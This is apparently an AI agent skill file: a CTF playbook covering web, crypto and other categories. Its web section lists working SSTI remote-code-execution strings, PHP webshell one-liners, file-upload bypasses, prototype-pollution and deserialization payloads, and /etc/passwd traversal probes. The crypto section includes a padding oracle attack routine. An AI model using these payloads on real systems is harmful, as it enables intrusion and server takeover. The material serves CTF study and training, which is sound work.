---
name: ctf-playbook
description: CTF (Capture The Flag) competition playbook — Web, Crypto, Reverse Engineering,
  PWN/Binary Exploitation, Forensics, Steganography, OSINT, and Misc categories. Covers
  methodology, tools, common vulnerabilities, and exploit patterns for each CTF category.
version: 1.0.0
category: red-teaming
license: MIT
metadata:
  hermes_origin: import
tags:
- CTF
- capture-the-flag
- crypto
- reversing
- pwn
- binary-exploitation
- forensics
- steganography
- OSINT
- web-exploitation
related_skills:
- web-app-pentest
- client-auth-bypass
- security-orchestrator
- network-pentest
---

# CTF Playbook

Comprehensive playbook for CTF competitions. Each category has its methodology, tools, common challenges, and exploit patterns.

## Category Quick Reference
| Category | Common tools | Typical challenges |
|:---------|:-------------|:-------------------|
| **Web** | Burp Suite, curl, Python requests | SQLi, XSS, SSTI, LFI, SSRF, deserialization, JWT |
| **Crypto** | Python, SageMath, CyberChef, RsaCtfTool | RSA, AES, padding oracle, hash collisions, classical ciphers |
| **Reverse Engineering** | Ghidra, IDA Free, radare2, gdb, angr | Binary analysis, obfuscation, packing, custom VMs |
| **PWN** | pwntools, gdb/pwndbg, ROPgadget, checksec | Buffer overflow, ROP, format string, heap exploitation |
| **Forensics** | binwalk, foremost, volatility, Wireshark, strings | File carving, memory forensics, PCAP analysis, disk images |
| **Steganography** | steghide, zsteg, stegsolve, exiftool, binwalk | Image stego, audio stego, LSB, metadata |
| **OSINT** | Google dorking, Shodan, WHOIS, social media | Geolocation, image analysis, social engineering |
| **Misc** | Everything else | Programming, logic puzzles, game hacking, protocols |

---

## WEB
### Quick Start — The Web Checklist

```
1. View page source (Ctrl+U) — comments, hidden fields, debug info
2. Check robots.txt, sitemap.xml, .git/, .env, .DS_Store
3. Check all cookies, localStorage, sessionStorage
4. Check HTTP headers (X-Powered-By, Server, Set-Cookie)
5. Try default credentials (admin:admin, admin:password)
6. Test for SQLi in every parameter
7. Test for SSTI if {{7*7}} appears in output
8. Test for LFI with ../../etc/passwd
9. Check file upload for unrestricted types
10. Look for JWT tokens — try alg:none, weak secrets
```

### Common CTF Web Vulnerabilities

```python
# SSTI quick check — if {{7*7}} outputs 49, SSTI exists
SSTI_CHECK = '{{7*7}}'

# Flask/Jinja2 RCE
JINJA2_RCE = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
JINJA2_RCE_ALT = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}"

# PHP type juggling
PHP_MAGIC_HASH = '240610708'  # == 'QNKCDZO' in PHP loose comparison
PHP_TYPE_JUGGLE = {
    '0e12345': '0e67890',  # both evaluate to 0 in scientific notation
    'NULL': 'array() == NULL in PHP < 8',
}

# Node.js prototype pollution
NODE_PROTO = '{"__proto__":{"isAdmin":true}}'
NODE_PROTO2 = '{"constructor":{"prototype":{"isAdmin":true}}}'

# Deserialization
PHP_UNSERIALIZE_POP = '''
O:8:"Example1":1:{s:10:"cache_file";s:14:"/tmp/shell.php";}
'''
```

### File Upload Bypass Techniques

```python
FILE_UPLOAD_BYPASS = {
    'double_extension': 'shell.php.jpg',
    'null_byte': 'shell.php%00.jpg',
    'mime_bypass': "Content-Type: image/jpeg (with .php content)",
    'magic_bytes': 'GIF89a;\\n<?php system($_GET["cmd"]); ?>',  # starts with GIF header
    'svg_xss': '<svg/onload=alert(1)>',
    'phar_file': 'Create .phar archive with PHP payload',
    'htaccess': 'Upload .htaccess to execute custom extensions',
    'polyglot': 'Create files valid as both image and PHP',
}

# PHP webshell one-liner (for file upload challenges)
PHP_WEBSHELLS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php echo shell_exec($_GET["cmd"]); ?>',
    '<?=`$_GET[0]`?>',  # shortest
    '<script language="php">system($_GET[0]);</script>',
]
```

---

## CRYPTO
### Classical Ciphers

```python
# Caesar cipher
def caesar(text: str, shift: int) -> str:
    result = []
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    return ''.join(result)

# Vigenère cipher
def vigenere(text: str, key: str, decrypt: bool = True) -> str:
    result = []
    key_idx = 0
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
            if decrypt:
                shift = -shift
            result.append(chr((ord(c) - base + shift) % 26 + base))
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)

# XOR cipher
def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

# XOR single-byte key brute force
def xor_brute_single_byte(data: bytes):
    results = []
    for key in range(256):
        decrypted = bytes(b ^ key for b in data)
        # Score by English character frequency
        score = sum(1 for b in decrypted if 32 <= b < 127)
        results.append((key, decrypted, score))
    return sorted(results, key=lambda x: x[2], reverse=True)
```

### RSA Attacks

```python
# RSA Common attacks checklist
RSA_ATTACKS = [
    'Small e (e=3): Cube root attack if m^e < n',
    'Common modulus: Same n, different e — extended GCD',
    'Small p or q: FactorDB lookup',
    'Close primes: Fermat factorization if |p-q| is small',
    'Wiener attack: Small d (d < n^0.25)',
    'Boneh-Durfee: Larger d (d < n^0.292)',
    'Håstad broadcast: Same message sent to e different recipients',
    'Franklin-Reiter: Related messages with same modulus',
    'Coppersmith: Known high bits of message or factor',
    'GCD of multiple keys: Find common factors across many public keys',
]

# Quick RSA decode from PEM
def rsa_from_pem(pem_data: str):
    """Extract n, e from PEM public key."""
    from cryptography.hazmat.primitives import serialization
    key = serialization.load_pem_public_key(pem_data.encode())
    numbers = key.public_numbers()
    return numbers.n, numbers.e

# Check if n is in FactorDB
def factordb_check(n: int):
    import requests
    r = requests.get(f'http://factordb.com/api?query={n}')
    data = r.json()
    if data['status'] == 'FF':  # fully factored
        factors = data['factors']
        return factors
    return None
```

### AES Attacks

```python
AES_MODES_ATTACKS = {
    'ECB': 'Identical plaintext blocks → identical ciphertext blocks. Penguin attack.',
    'CBC': 'Padding oracle if server reveals padding errors. Bit flipping on IV.',
    'CTR': 'Nonce reuse → XOR ciphertexts to get XOR of plaintexts.',
    'GCM': 'Nonce reuse → H key recovery → full forgery.',
    'OFB/CFB': 'Bit flipping attack — single bit change in ciphertext flips corresponding bit in plaintext.',
}

# Padding oracle attack (CBC mode)
def padding_oracle(ciphertext: bytes, iv: bytes, oracle_fn, block_size: int = 16) -> bytes:
    """Generic padding oracle attack on CBC mode.
    oracle_fn: function(ct, iv) -> bool (True if padding valid)
    """
    blocks = [iv] + [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    
    for block_idx in range(1, len(blocks)):
        intermediate = bytearray(block_size)
        for byte_pos in range(block_size - 1, -1, -1):
            pad_value = block_size - byte_pos
            crafted_iv = bytearray(block_size)
            for j in range(block_size - 1, byte_pos, -1):
                crafted_iv[j] = intermediate[j] ^ pad_value
            
            found = False
            for guess in range(256):
                crafted_iv[byte_pos] = guess
                if oracle_fn(blocks[block_idx], bytes(crafted_iv)):
                    intermediate[byte_pos] = guess ^ pad_value
                    found = True
                    break
            
            if not found:
                crafted_iv[byte_pos] = intermediate[byte_pos] ^ 1
                if oracle_fn(blocks[block_idx], bytes(crafted_iv)):
                    intermediate[byte_pos] = intermediate[byte_pos] ^ 1
                    found = True
        
        pt_block = bytes(a ^ b for a, b in zip(intermediate, blocks[block_idx - 1]))
        plaintext += pt_block
    
    return plaintext
```

## See Also

- `references/elliptic-curve-cryptography-ecc-attacks.md` — Elliptic Curve Cryptography Ecc Attacks
- `references/lattice-based-attacks.md` — Lattice Based Attacks
- `references/hash-attacks.md` — Hash Attacks
- `references/advanced-rsa-attacks.md` — Advanced Rsa Attacks
- `references/ecc-deep-attacks.md` — Ecc Deep Attacks
- `references/symmetric-cryptanalysis.md` — Symmetric Cryptanalysis
- `references/lattice-cryptography-deep-dive.md` — Lattice Cryptography Deep Dive
- `references/authenticated-encryption-attacks.md` — Authenticated Encryption Attacks
- `references/side-channel--fault-attacks.md` — Side Channel  Fault Attacks
- `references/zkp--protocol-attacks.md` — Zkp  Protocol Attacks
- `references/quantum--post-quantum.md` — Quantum  Post Quantum
- `references/blockchain--cryptocurrency-crypto.md` — Blockchain  Cryptocurrency Crypto
- `references/historical-ciphers--specialized-attacks.md` — Historical Ciphers  Specialized Attacks
- `references/reverse-engineering.md` — Reverse Engineering
- `references/pwn--binary-exploitation.md` — Pwn  Binary Exploitation
- `references/advanced-stack-exploitation.md` — Advanced Stack Exploitation
- `references/fsop--file-stream-oriented-programming.md` — Fsop  File Stream Oriented Programming
- `references/kernel-exploitation.md` — Kernel Exploitation
- `references/v8browser-exploitation.md` — V8Browser Exploitation
- `references/mitigation-bypass-techniques.md` — Mitigation Bypass Techniques
- `references/integer-overflow--type-confusion.md` — Integer Overflow  Type Confusion
- `references/cross-architecture-pwn.md` — Cross Architecture Pwn
- `references/pwntools-advanced-usage.md` — Pwntools Advanced Usage
- `references/gdbpwndbg-advanced.md` — Gdbpwndbg Advanced
- `references/forensics.md` — Forensics
- `references/steganography.md` — Steganography
- `references/osint-in-ctf-context.md` — Osint In Ctf Context
- `references/ctf-automation-script.md` — Ctf Automation Script
- `references/deep-knowledge-references.md` — Deep Knowledge References
- `references/pitfalls.md` — Pitfalls
